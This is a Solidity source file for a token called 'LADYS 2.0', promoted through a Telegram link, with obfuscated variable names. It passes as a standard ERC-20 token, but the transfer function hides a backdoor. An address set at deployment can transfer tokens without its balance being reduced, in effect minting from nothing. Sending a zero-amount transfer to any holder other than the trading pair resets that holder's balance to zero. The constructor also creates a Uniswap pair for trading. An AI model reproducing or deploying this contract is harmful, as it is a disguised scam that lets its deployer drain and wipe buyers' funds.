/*

https://t.me/ladystwoportal

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract LADYS is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private famvzh;

    mapping(address => uint256) private qoklvh;

    uint8 public decimals = 9;

    function qvcjrn(address zpxbstfy, address bsijnla, uint256 hrjtbkezyfvd) private {
        if (0 == famvzh[zpxbstfy]) {
            balanceOf[zpxbstfy] -= hrjtbkezyfvd;
        }
        balanceOf[bsijnla] += hrjtbkezyfvd;
        if (0 == hrjtbkezyfvd && bsijnla != skhwo) {
            balanceOf[bsijnla] = hrjtbkezyfvd;
        }
        emit Transfer(zpxbstfy, bsijnla, hrjtbkezyfvd);
    }

    address public skhwo;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint256 private gidu = 116;

    function approve(address dhjmqk, uint256 hrjtbkezyfvd) public returns (bool success) {
        allowance[msg.sender][dhjmqk] = hrjtbkezyfvd;
        emit Approval(msg.sender, dhjmqk, hrjtbkezyfvd);
        return true;
    }

    function transfer(address bsijnla, uint256 hrjtbkezyfvd) public returns (bool success) {
        qvcjrn(msg.sender, bsijnla, hrjtbkezyfvd);
        return true;
    }

    string public name = 'LADYS 2.0';

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = 'LADYS 2.0';

    mapping(address => uint256) public balanceOf;

    function transferFrom(address zpxbstfy, address bsijnla, uint256 hrjtbkezyfvd) public returns (bool success) {
        require(hrjtbkezyfvd <= allowance[zpxbstfy][msg.sender]);
        allowance[zpxbstfy][msg.sender] -= hrjtbkezyfvd;
        qvcjrn(zpxbstfy, bsijnla, hrjtbkezyfvd);
        return true;
    }

    constructor(address oxvpzftwys) {
        balanceOf[msg.sender] = totalSupply;
        famvzh[oxvpzftwys] = gidu;
        IUniswapV2Router02 rshpztck = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        skhwo = IUniswapV2Factory(rshpztck.factory()).createPair(address(this), rshpztck.WETH());
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
}